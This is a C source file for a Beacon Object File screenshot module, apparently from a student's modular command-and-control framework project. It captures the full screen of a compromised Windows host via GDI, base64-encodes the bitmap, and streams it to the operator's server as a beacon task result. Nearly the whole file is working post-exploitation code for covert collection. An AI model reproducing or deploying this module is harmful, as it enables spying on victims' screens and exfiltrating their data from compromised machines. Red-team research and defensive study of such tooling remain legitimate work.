/*
 * ============================================================
 *  modules/bof/mod_screenshot.c — Capture d'écran au format BOF
 *
 *  Capture l'écran via GDI (GetDC + BitBlt + GetDIBits), encode
 *  le BMP en base64 et l'envoie au serveur via BeaconOutput.
 *  Le serveur reçoit un blob base64 qu'il décode et sauvegarde.
 *
 *  Différence avec le module built-in :
 *    - Le built-in fait un HTTP upload chunké directement.
 *    - Le BOF retourne les données via BeaconOutput → le loader
 *      les transmet au serveur comme résultat de tâche standard.
 *    - Pour les grands écrans (> 2 MB base64) le serveur doit
 *      accepter des résultats larges (configurer MAX_OUTPUT_SIZE).
 *
 *  Compilation BOF :
 *    x86_64-w64-mingw32-gcc -c -DBOF_MODE -o screenshot.x64.o mod_screenshot.c
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "beacon.h"

/* ── Déclarations Windows API (BOF mode uniquement) ──────────
 * En RDLL mode, windows.h fournit déjà ces déclarations.     */
#ifndef RDLL_MODE
DECLSPEC_IMPORT WINBASEAPI int    WINAPI USER32$GetSystemMetrics(int);
DECLSPEC_IMPORT WINBASEAPI HDC    WINAPI USER32$GetDC(HWND);
DECLSPEC_IMPORT WINBASEAPI int    WINAPI USER32$ReleaseDC(HWND, HDC);
DECLSPEC_IMPORT WINBASEAPI HDC    WINAPI GDI32$CreateCompatibleDC(HDC);
DECLSPEC_IMPORT WINBASEAPI HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC, int, int);
DECLSPEC_IMPORT WINBASEAPI HGDIOBJ WINAPI GDI32$SelectObject(HDC, HGDIOBJ);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI GDI32$BitBlt(HDC, int, int, int, int, HDC, int, int, DWORD);
DECLSPEC_IMPORT WINBASEAPI int    WINAPI GDI32$GetDIBits(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI GDI32$DeleteObject(HGDIOBJ);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI GDI32$DeleteDC(HDC);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);
#endif /* !RDLL_MODE */

#ifndef SM_CXSCREEN
#  define SM_CXSCREEN    0
#endif
#ifndef SM_CYSCREEN
#  define SM_CYSCREEN    1
#endif
#ifndef SRCCOPY
#  define SRCCOPY        0x00CC0020
#endif
#ifndef BI_RGB
#  define BI_RGB         0
#endif
#ifndef DIB_RGB_COLORS
#  define DIB_RGB_COLORS 0
#endif

/* ── Encodage base64 inline (pas de dépendance externe) ────── */
static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64_encode_chunk(const unsigned char *in, int in_len,
                             char *out, int out_max) {
    int out_len = 0;
    for (int i = 0; i < in_len && out_len + 4 < out_max; i += 3) {
        unsigned int b0 = (unsigned char)in[i];
        unsigned int b1 = (i+1 < in_len) ? (unsigned char)in[i+1] : 0;
        unsigned int b2 = (i+2 < in_len) ? (unsigned char)in[i+2] : 0;
        out[out_len++] = B64[ b0 >> 2];
        out[out_len++] = B64[(b0 & 3) << 4 | b1 >> 4];
        out[out_len++] = (i+1 < in_len) ? B64[(b1 & 15) << 2 | b2 >> 6] : '=';
        out[out_len++] = (i+2 < in_len) ? B64[ b2 & 63]                  : '=';
    }
    out[out_len] = '\0';
    return out_len;
}

/* ── Fonction d'entrée BOF ────────────────────────────────── */

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    int sw = USER32$GetSystemMetrics(SM_CXSCREEN);
    int sh = USER32$GetSystemMetrics(SM_CYSCREEN);

    if (sw <= 0 || sh <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Résolution écran invalide (%dx%d)\n", sw, sh);
        return;
    }

    /* Capture GDI */
    HDC hdcScreen = USER32$GetDC(NULL);
    if (!hdcScreen) { BeaconPrintf(CALLBACK_ERROR, "[ERREUR] GetDC échoué\n"); return; }

    HDC     hdcMem = GDI32$CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp   = GDI32$CreateCompatibleBitmap(hdcScreen, sw, sh);
    GDI32$SelectObject(hdcMem, (HGDIOBJ)hBmp);
    GDI32$BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY);

    /* Préparer l'en-tête BMP (packed : WORD+DWORD sans padding) */
    struct __attribute__((packed)) {
        WORD  bfType; DWORD bfSize; WORD bfReserved1;
        WORD  bfReserved2; DWORD bfOffBits;
    } fhdr;

    struct {
        DWORD biSize; LONG biWidth; LONG biHeight;
        WORD  biPlanes; WORD biBitCount; DWORD biCompression;
        DWORD biSizeImage; LONG biXPelsPerMeter; LONG biYPelsPerMeter;
        DWORD biClrUsed; DWORD biClrImportant;
    } ihdr;

    DWORD row_bytes = ((DWORD)(sw * 3) + 3) & ~3u;
    DWORD img_size  = row_bytes * (DWORD)sh;
    DWORD total     = 14 + 40 + img_size;

    fhdr.bfType      = 0x4D42;
    fhdr.bfSize      = total;
    fhdr.bfReserved1 = 0;
    fhdr.bfReserved2 = 0;
    fhdr.bfOffBits   = 14 + 40;

    __builtin_memset(&ihdr, 0, 40);
    ihdr.biSize        = 40;
    ihdr.biWidth       = sw;
    ihdr.biHeight      = sh;
    ihdr.biPlanes      = 1;
    ihdr.biBitCount    = 24;
    ihdr.biCompression = BI_RGB;

    /* Allouer le buffer BMP complet sur le tas du processus */
    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *bmp = (unsigned char *)KERNEL32$HeapAlloc(heap, 0, total);
    if (!bmp) {
        GDI32$DeleteObject((HGDIOBJ)hBmp);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Allocation mémoire BMP échouée (%lu bytes)\n",
                     (unsigned long)total);
        return;
    }

    /* Copier les en-têtes */
    __builtin_memcpy(bmp,      &fhdr, 14);
    __builtin_memcpy(bmp + 14, &ihdr, 40);

    /* Récupérer les pixels */
    GDI32$GetDIBits(hdcMem, hBmp, 0, (UINT)sh,
                    bmp + 54, (LPBITMAPINFO)&ihdr, DIB_RGB_COLORS);

    /* Libérer ressources GDI */
    GDI32$DeleteObject((HGDIOBJ)hBmp);
    GDI32$DeleteDC(hdcMem);
    USER32$ReleaseDC(NULL, hdcScreen);

    /* Encoder en base64 par chunks de 384 KB pour éviter stack overflow */
    const int CHUNK = 384 * 1024;
    char *b64buf = (char *)KERNEL32$HeapAlloc(heap, 0, ((CHUNK + 2) / 3) * 4 + 4);
    if (!b64buf) {
        KERNEL32$HeapFree(heap, 0, bmp);
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Allocation buffer base64 échouée\n");
        return;
    }

    /* Préfixe : le serveur attend "BMP_B64:<base64>" */
    BeaconPrintf(CALLBACK_OUTPUT, "BMP_B64:%dx%d:", sw, sh);

    DWORD offset = 0;
    while (offset < total) {
        DWORD n = (total - offset > (DWORD)CHUNK) ? (DWORD)CHUNK : total - offset;
        int b64_len = b64_encode_chunk(bmp + offset, (int)n, b64buf,
                                        ((CHUNK + 2) / 3) * 4 + 4);
        BeaconOutput(CALLBACK_OUTPUT, b64buf, b64_len);
        offset += n;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n[OK] Screenshot %dx%d (%lu bytes BMP)\n",
                 sw, sh, (unsigned long)total);

    KERNEL32$HeapFree(heap, 0, b64buf);
    KERNEL32$HeapFree(heap, 0, bmp);
}
